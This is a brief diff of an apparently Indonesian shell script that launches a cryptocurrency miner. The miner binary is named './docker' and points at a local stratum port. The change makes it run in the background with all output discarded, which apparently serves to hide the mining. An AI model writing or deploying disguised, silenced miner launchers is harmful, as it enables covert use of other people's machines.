@@ -21,5 +21,5 @@ if ! ss -tulpn | grep :4629; then
 fi
 
 echo "Menjalankan Miner..."
-# 4. Jalankan miner
-./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1
+# 4. Jalankan miner 
+./docker -c docker.json -o stratum+tcp://127.0.0.1:4629 -t 1 >/dev/null 2>&1 &
